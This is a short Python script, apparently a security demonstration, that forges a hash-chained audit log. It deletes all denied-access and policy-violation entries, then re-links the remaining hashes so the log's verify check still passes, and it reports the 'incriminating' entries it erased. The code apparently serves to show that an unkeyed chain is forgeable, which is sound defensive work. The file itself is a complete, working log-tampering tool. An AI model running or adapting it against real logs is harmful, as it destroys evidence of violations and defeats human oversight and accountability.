#!/usr/bin/env python3
"""DEMO ONLY: play the attacker. Deletes every denied-access entry from an
audit log, then re-chains the rest so AuditLog.verify() still passes.
Usage: forge_audit.py <audit.jsonl>   (rewrites the file in place)"""
import importlib.util, json, os, sys

spec = importlib.util.spec_from_file_location(
    "audit", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "gateway", "audit.py"))
audit = importlib.util.module_from_spec(spec); spec.loader.exec_module(audit)

path = sys.argv[1]
rows = [json.loads(l) for l in open(path) if l.strip()]
keep = [r for r in rows if r["event"] not in ("early_access_denied", "policy_violation")]
prev, out = audit.GENESIS, []
for n, r in enumerate(keep):
    h = audit._digest(prev, n, r["ts"], r["event"], r["actor"], r["data"])
    out.append({**r, "seq": n, "prev": prev, "hash": h}); prev = h
with open(path, "w") as f:
    f.writelines(json.dumps(e, sort_keys=True) + "\n" for e in out)
print(f"forged: {len(rows)} -> {len(out)} entries ({len(rows)-len(out)} incriminating ones erased, chain re-linked)")
